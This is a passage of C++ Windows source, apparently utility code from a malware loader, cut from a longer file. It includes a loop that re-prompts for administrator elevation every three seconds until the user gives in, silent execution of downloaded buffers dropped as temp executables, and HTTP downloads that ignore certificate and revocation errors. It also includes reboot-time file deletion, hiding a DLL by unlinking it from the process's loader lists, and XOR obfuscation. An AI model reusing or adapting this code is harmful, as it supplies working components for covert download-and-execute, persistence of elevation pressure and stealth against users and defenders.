	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
	{
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, SeNamePriv, &SeValue)) 
	{
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = SeValue;
	tp.Privileges[0].Attributes = EnableTF ? SE_PRIVILEGE_ENABLED : 0;

	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

	CloseHandle(hToken);
	return TRUE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Utils::CheckMutex(DWORD Id, PCHAR Sign)
{
	CHAR MutexName[MAX_PATH];
	HANDLE MutexHandle;

	_snprintf(MutexName, RTL_NUMBER_OF(MutexName), "Global\\%s%x", Sign, Id);
	if (MutexHandle = OpenMutexA(MUTEX_MODIFY_STATE, FALSE, MutexName))
	{
		CloseHandle(MutexHandle);

		return FALSE;
	}

	return TRUE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

HANDLE Utils::CreateCheckMutex(DWORD Id, PCHAR Sign)
{
	CHAR MutexName[MAX_PATH];
	HANDLE MutexHandle;

	_snprintf(MutexName, RTL_NUMBER_OF(MutexName), "Global\\%s%x", Sign, Id);
	if (MutexHandle = CreateMutexA(NULL, FALSE, MutexName))
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
		{
			return MutexHandle;
		}

		CloseHandle(MutexHandle);
	}

	return 0;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Utils::RestartModuleShellExec(PCHAR FilePath)
{
	SHELLEXECUTEINFO sei = {0};
	CHAR TempPath[MAX_PATH];
	CHAR TempName[MAX_PATH];
	PVOID Buffer;
	DWORD Size;

	if (!StrStrI(FilePath, ".exe"))
	{
		GetTempPath(RTL_NUMBER_OF(TempPath), TempPath);
		GetTempFileName(TempPath, NULL, 0, TempName);
		lstrcat(TempName, ".exe");

		if (Buffer = Utils::FileRead(FilePath, &Size))
		{
			if (Utils::FileWrite(TempName, CREATE_ALWAYS, Buffer, Size))
			{
				FilePath = TempName;
			}
		}
	}
	sei.cbSize = sizeof(sei);
	sei.lpFile = FilePath;
	sei.lpVerb = "runas";
	sei.hwnd = GetForegroundWindow();
	while (!ShellExecuteEx(&sei))
	{
		DbgMsg(__FUNCTION__"(): ShellExecuteEx error: %x\r\n", GetLastError());

		Sleep(3000);
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOL Utils::StartExe(LPSTR lpFilePath)
{
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};

	si.cb = sizeof(si);

	BOOL bRet = CreateProcess(NULL, lpFilePath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (bRet)
	{
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
	else
	{
		DbgMsg(__FUNCTION__"(): CreateProcess failed last error %lx\r\n",GetLastError());
	}

	return bRet;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN Utils::WriteFileAndExecute(PVOID File, DWORD Size)
{
	CHAR chTempPath[MAX_PATH];
	CHAR chTempName[MAX_PATH];

	GetTempPath(sizeof(chTempPath), chTempPath);
	GetTempFileName(chTempPath, NULL, 0, chTempName);
	lstrcat(chTempName, ".exe");

	if (Utils::FileWrite(chTempName, CREATE_ALWAYS, File, Size))
	{
		//return Utils::StartExe(chTempName);

		WinExec(chTempName, 0);

		return TRUE;
	}

	return FALSE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Utils::DeleteFileReboot(PCHAR pcFilePath)
{
	CHAR chTempPath[MAX_PATH];
	CHAR chTempName[MAX_PATH];

	GetTempPath(RTL_NUMBER_OF(chTempPath), chTempPath);
	GetTempFileName(chTempPath, NULL, 0, chTempName);

	if (!MoveFileEx(pcFilePath, chTempName, MOVEFILE_REPLACE_EXISTING|MOVEFILE_WRITE_THROUGH))
	{
		DbgMsg(__FUNCTION__"(): MoveFileEx error 0x%x\r\n", GetLastError());
	}
	else
		DeleteFile(chTempName);

	if (!MoveFileEx(chTempName, NULL, MOVEFILE_DELAY_UNTIL_REBOOT|MOVEFILE_WRITE_THROUGH))
	{
		DbgMsg(__FUNCTION__"(): MoveFileEx error 0x%x\r\n", GetLastError());
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

CHAR g_chUserAgent[260] = {0};

VOID WinetSetUserAgent(PCHAR pcUserAgent)
{
	lstrcpy(g_chUserAgent, pcUserAgent);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID WinetGetUserAgentStr(PCHAR pcUAOut, DWORD dwUAOut)
{
	if (g_chUserAgent[0])
	{
		lstrcpyn(pcUAOut, g_chUserAgent, dwUAOut);
	}
	else
	{
		DWORD dwUARet = dwUAOut;
		typedef HRESULT (WINAPI *_ObtainUserAgentString)(DWORD dwOption, PCHAR *pcszUAOut, DWORD *cbSize);
		_ObtainUserAgentString pObtainUserAgentString = (_ObtainUserAgentString)GetProcAddress(LoadLibrary("urlmon.dll"), "ObtainUserAgentString");

		if (!pObtainUserAgentString || pObtainUserAgentString(0, (PCHAR *)pcUAOut, &dwUARet) != NOERROR)
		{
			lstrcpyn(pcUAOut, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.1)", dwUAOut);
		}
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD_PTR Utils::ExecExportProcedure(PVOID ModuleBase, PCHAR pcProcedure, PCHAR pcParameters)
{
	DWORD_PTR Result = 0;
	DWORD dwWCStrings = 0;
	DWORD_PTR dwParameterLength;
	PCHAR pcParameter = pcParameters;
	WCHAR wcStrings[18][MAX_PATH] = {0};
	PDWORD_PTR pdwpParameters = (PDWORD_PTR)alloca(18*sizeof(DWORD_PTR));
	PCHAR pcParameterEnd;
	CHAR cEnd;
	BOOLEAN bWideChar;
#ifdef _WIN64
	typedef DWORD_PTR (WINAPI *FPPROC)(DWORD_PTR, DWORD_PTR, DWORD_PTR, DWORD_PTR, DWORD_PTR, DWORD_PTR, DWORD_PTR, DWORD_PTR, DWORD_PTR);
	PDWORD_PTR pStart = pdwpParameters;
	FPPROC fpProcedure;
#else
	FARPROC fpProcedure;
#endif
	DWORD dwScaned;
	DWORD dwLength;

	ZeroMemory(pdwpParameters, 18*sizeof(DWORD_PTR));
	while (*pcParameter)
	{
		if (*pcParameter == '\"' || *pcParameter=='\'' || *(PWORD)pcParameter=='\"L')
		{
			bWideChar = FALSE;

			if (*pcParameter=='L')
			{
				pcParameter++;
				bWideChar = TRUE;
			}

			cEnd = *pcParameter;
			pcParameter++;
			pcParameterEnd = strchr(pcParameter, cEnd);			
			if (!pcParameterEnd) break; else *pcParameterEnd = '\0';

			if (bWideChar)
			{
				if (dwWCStrings == 18) break;

				*pdwpParameters = (DWORD_PTR)wcStrings[dwWCStrings];
				if (_snwprintf(wcStrings[dwWCStrings++], RTL_NUMBER_OF(wcStrings[0])-1, L"%S", pcParameter) == -1) break;
			}
			else *pdwpParameters = (DWORD_PTR)pcParameter;

			pcParameterEnd++;
			if (*pcParameterEnd == ',') pcParameterEnd++; else if (*pcParameterEnd != '\0') break;

			dwParameterLength = (DWORD_PTR)(pcParameterEnd - pcParameter);
		}
		else
		{
			pcParameterEnd = strchr(pcParameter, ',');
			if (pcParameterEnd)
			{
				*pcParameterEnd = '\0';
				dwParameterLength = (DWORD_PTR)(pcParameterEnd - pcParameter) + 1;
			}
			else 
			{
				dwParameterLength = lstrlen(pcParameter);
			}

			dwLength = lstrlen(pcParameter);
			if (dwLength > 2 && *(PWORD)pcParameter == 'x0')
			{
				dwScaned = sscanf(pcParameter, "%x", pdwpParameters);
			}
			else
			{
				dwScaned = sscanf(pcParameter, strchr(pcParameter, '.') ? "%f" : "%d", pdwpParameters);
			}

			if (dwScaned != 1) break;
		}

		pcParameter += dwParameterLength;
		pdwpParameters++;
	}

#ifdef _WIN64
	if (fpProcedure = (FPPROC)PeLdr::PeGetProcAddress(ModuleBase, pcProcedure)) 
	{
		Result = fpProcedure(pStart[0], pStart[1], pStart[2], pStart[3], pStart[4], pStart[5], pStart[6], pStart[7], pStart[8]);
	}
#else
	if (fpProcedure = (FARPROC)PeLdr::PeGetProcAddress(ModuleBase, pcProcedure)) 
	{
		Result = fpProcedure();
	}
#endif

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID WinetLoadUrl(PWINET_LOADURL pwlLoadUrl)
{
	PVOID pvBuffer = NULL;
	DWORD dwSize;
	CHAR chUserAgentStr[MAX_PATH];
	URL_COMPONENTS ucUrlComp = {0};
	HINTERNET hInternet;
	HINTERNET hConnect;
	HINTERNET hRequest;
	DWORD dwSecFlags;
	DWORD dwFlags;
	DWORD dwReaded;
	PVOID pvTemp;

	WinetGetUserAgentStr(chUserAgentStr, RTL_NUMBER_OF(chUserAgentStr));
	hInternet = InternetOpen(chUserAgentStr, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet)
	{
		ucUrlComp.dwStructSize = sizeof(URL_COMPONENTS);
		ucUrlComp.dwHostNameLength = MAX_PATH;
		ucUrlComp.lpszHostName = (PCHAR)alloca(ucUrlComp.dwHostNameLength);
		ucUrlComp.dwUrlPathLength = lstrlen(pwlLoadUrl->pcUrl)*2;
		ucUrlComp.lpszUrlPath = (PCHAR)alloca(ucUrlComp.dwUrlPathLength);

		if (InternetCrackUrl(pwlLoadUrl->pcUrl, ucUrlComp.dwUrlPathLength, ICU_ESCAPE, &ucUrlComp))
		{
			hConnect = InternetConnect(hInternet, ucUrlComp.lpszHostName, ucUrlComp.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
			if (hConnect)
			{
				dwFlags = INTERNET_FLAG_NO_COOKIES|INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE|INTERNET_FLAG_PRAGMA_NOCACHE;
				if (ucUrlComp.nScheme == INTERNET_SCHEME_HTTPS) dwFlags |= INTERNET_FLAG_SECURE|INTERNET_FLAG_IGNORE_CERT_CN_INVALID|INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;

				hRequest = HttpOpenRequest(hConnect, pwlLoadUrl->pcMethod, ucUrlComp.lpszUrlPath, NULL, NULL, NULL, dwFlags, 0);
				if (hRequest)
				{
					dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA|SECURITY_FLAG_IGNORE_REVOCATION|SECURITY_FLAG_IGNORE_WRONG_USAGE|SECURITY_FLAG_IGNORE_REDIRECT_TO_HTTPS;
					InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(DWORD));

					if (HttpSendRequest(hRequest, pwlLoadUrl->pcHeaders, pwlLoadUrl->dwHeaders, pwlLoadUrl->pvPstData, pwlLoadUrl->dwPstData))
					{
						dwSize = sizeof(DWORD);
						if (!HttpQueryInfo(hRequest, HTTP_QUERY_STATUS_CODE|HTTP_QUERY_FLAG_NUMBER, &pwlLoadUrl->dwStatus, &dwSize, NULL))
						{
							pwlLoadUrl->dwStatus = -1;

							DbgMsg(__FUNCTION__"(): HttpQueryInfo fails; last error: %x\r\n", GetLastError());
						}

						dwSize = 0;
						pvTemp = alloca(MAX_PATH*4);
						for (;;)
						{
							if (InternetReadFile(hRequest, pvTemp, MAX_PATH*4, &dwReaded) && dwReaded)
							{
								if (!pvBuffer) pvBuffer = malloc(dwReaded + 1); else pvBuffer = realloc(pvBuffer, dwSize + dwReaded + 1);
								if (pvBuffer)
								{
									CopyMemory(RtlOffsetToPointer(pvBuffer, dwSize), pvTemp, dwReaded);
									*RtlOffsetToPointer(pvBuffer, dwSize + dwReaded) = '\0';

									dwSize += dwReaded;
								} 
								else break;
							}
							else 
							{
								if (!dwSize && pvBuffer)
								{
									free(pvBuffer);
								}

								pwlLoadUrl->dwBuffer = dwSize;

								break;
							}
						}
					}
					else
					{
						//DbgMsg(__FUNCTION__"(): HttpSendRequest fails; last error: %x\r\n", GetLastError());
					}

					InternetCloseHandle(hRequest);
				}
				else
				{
					DbgMsg(__FUNCTION__"(): HttpOpenRequest fails; last error: %x\r\n", GetLastError());
				}

				InternetCloseHandle(hConnect);
			}
			else
			{
				DbgMsg(__FUNCTION__"(): InternetConnect fails; last error: %x\r\n", GetLastError());
			}
		}
		else
		{
			DbgMsg(__FUNCTION__"(): InternetCrackUrl fails; last error: %x\r\n", GetLastError());
		}

		InternetCloseHandle(hInternet);
	}
	else
	{
		DbgMsg(__FUNCTION__"(): InternetOpen fails; last error: %x\r\n", GetLastError());
	}

	return pvBuffer;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID WinetLoadUrlThread(PWINET_LOADURL pwiLoad)
{
	PVOID pvResult;

	for (DWORD i = 0; i < pwiLoad->dwRetry; i++)
	{
		pvResult = WinetLoadUrl(pwiLoad);
		if (pvResult) break;
	}

	return pvResult;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID WinetLoadUrlWait(PWINET_LOADURL pwlLoadUrl, DWORD dwWait)
{
	return (PVOID)Utils::ThreadCreate(WinetLoadUrlThread, pwlLoadUrl, NULL, dwWait);
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

static bool crc32Intalized = false;
static DWORD crc32table[256];

DWORD Utils::crc32Hash(const void *data, DWORD size)
{
  if(crc32Intalized == false)
  {
    register DWORD crc;
    for(register DWORD i = 0; i < 256; i++)
    {
      crc = i;
      for(register DWORD j = 8; j > 0; j--)
      {
        if(crc & 0x1)crc = (crc >> 1) ^ 0xEDB88320L;
        else crc >>= 1;
      }
      crc32table[i] = crc;
    }

    crc32Intalized = true;
  }

  register DWORD cc = 0xFFFFFFFF;
  for(register DWORD i = 0; i < size; i++)cc = (cc >> 8) ^ crc32table[(((LPBYTE)data)[i] ^ cc) & 0xFF];
  return ~cc;
}

PVOID Utils::MapBinary(LPCSTR lpPath,DWORD dwFileAccess,DWORD dwFileFlags,DWORD dwPageAccess,DWORD dwMapAccess,PDWORD pdwSize)
{
	PVOID pMap = NULL;
	HANDLE hMapping;
	HANDLE hFile;

	hFile = CreateFile(lpPath,dwFileAccess,FILE_SHARE_READ,NULL,OPEN_EXISTING,dwFileFlags,0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		hMapping = CreateFileMappingA(hFile,NULL,dwPageAccess,0,0,0);
		if (hMapping != INVALID_HANDLE_VALUE)
		{
			pMap = MapViewOfFile(hMapping,dwMapAccess,0,0,0);
			if (!pMap)
			{
				DbgMsg(__FUNCTION__"(): MapViewOfFile failed with error %x\n",GetLastError());
			}
			else if (pdwSize) *pdwSize = GetFileSize(hFile,NULL);

			CloseHandle(hMapping);
		}
		else
		{
			DbgMsg(__FUNCTION__"(): CreateFileMapping failed with error %x\n",GetLastError());
		}

		CloseHandle(hFile);
	}
	else
	{
		DbgMsg(__FUNCTION__"(): CreateFile failed with error %x\n",GetLastError());
	}

	return pMap;
}
#ifndef _WIN64
VOID Utils::FixDWORD(BYTE *Data,DWORD Size,DWORD Old,DWORD New)
{
	DWORD p = 0;
	PDWORD pDD;

	while (p < Size)
	{
		pDD = (PDWORD)(Data + p);
		if (*pDD == Old) *(DWORD*)(Data + p) = New;

		p++;
	}
}
#endif
VOID Utils::HideDllPeb(LPCSTR lpDllName)
{
	PLDR_DATA_TABLE_ENTRY pldteDllEntry;
	PLIST_ENTRY pleCurrentDll;
	PLIST_ENTRY pleHeadDll;
	PPEB_LDR_DATA ppldLoaderData;
#ifndef _WIN64
	PPEB ppPEB = (PPEB)__readfsdword(0x30);
#else
	PPEB ppPEB = (PPEB)__readgsqword(0x60);
#endif
	ppldLoaderData = ppPEB->Ldr;
	if (ppldLoaderData)
	{
		pleHeadDll = &ppldLoaderData->InLoadOrderModuleList;
		pleCurrentDll = pleHeadDll;
		while (pleCurrentDll && (pleHeadDll != (pleCurrentDll = pleCurrentDll->Flink)))
		{
			pldteDllEntry = CONTAINING_RECORD(pleCurrentDll,LDR_DATA_TABLE_ENTRY,InLoadOrderLinks);			
			if (pldteDllEntry && pldteDllEntry->Flags & 0x00000004)
			{
				CHAR Buffer[MAX_PATH];
				ANSI_STRING as = RTL_CONSTANT_STRING(Buffer);

				RtlUnicodeStringToAnsiString(&as,&pldteDllEntry->BaseDllName,FALSE);
				if (StrStrIA(Buffer,lpDllName))
				{
					DbgMsg(__FUNCTION__"(): Dll '%s' removed from loader data\n",lpDllName);

					RemoveEntryList(&pldteDllEntry->InLoadOrderLinks);
					RemoveEntryList(&pldteDllEntry->InInitializationOrderLinks);
					RemoveEntryList(&pldteDllEntry->InMemoryOrderLinks);
					RemoveEntryList(&pldteDllEntry->HashLinks);
				}
			}
		}
	}
}

VOID Utils::XorCrypt(PVOID source, DWORD size, DWORD key)
{
	register LPBYTE src = (LPBYTE)source;
	for(register int i=0; i<size; i++)
	{
		src[i] ^= key % (i + 1);
	}
}